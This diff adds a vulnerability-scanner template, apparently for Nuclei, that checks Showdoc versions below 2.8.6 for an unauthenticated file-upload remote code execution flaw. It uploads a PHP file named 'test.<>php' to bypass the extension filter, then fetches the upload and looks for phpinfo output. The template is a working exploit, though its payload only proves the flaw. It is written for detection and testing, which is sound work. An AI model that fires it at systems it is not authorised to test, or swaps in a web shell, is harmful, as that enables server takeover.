@@ -1,0 +1,47 @@
+id: showdoc-file-upload-rce
+info:
+  name: Showdoc < 2.8.6 File Upload RCE
+  author: pikpikcu
+  severity: critical
+  reference: https://github.com/star7th/showdoc/pull/1059
+  tags: rce,fileupload,showdoc
+
+requests:
+  - raw:
+      - |
+        POST /index.php?s=/home/page/uploadImg HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
+        Content-Length: 239
+        Content-Type: multipart/form-data; boundary=--------------------------835846770881083140190633
+        Accept-Encoding: gzip
+
+        ----------------------------835846770881083140190633
+        Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
+        Content-Type: text/plain
+
+        <?php phpinfo();?>
+        ----------------------------835846770881083140190633--
+
+      - |
+        GET /Public/Uploads{{url_decode("§path§")}} HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{BaseURL}}
+
+    extractors:
+      - type: regex
+        name: path
+        group: 1
+        internal: true
+        part: body
+        regex:
+          - '/Uploads\\(.*?)"\,"success"'
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_2, "PHP Extension")'
+          - 'contains(body_2, "PHP Version")'
+          - 'status_code_2 == 200'
+        condition: and
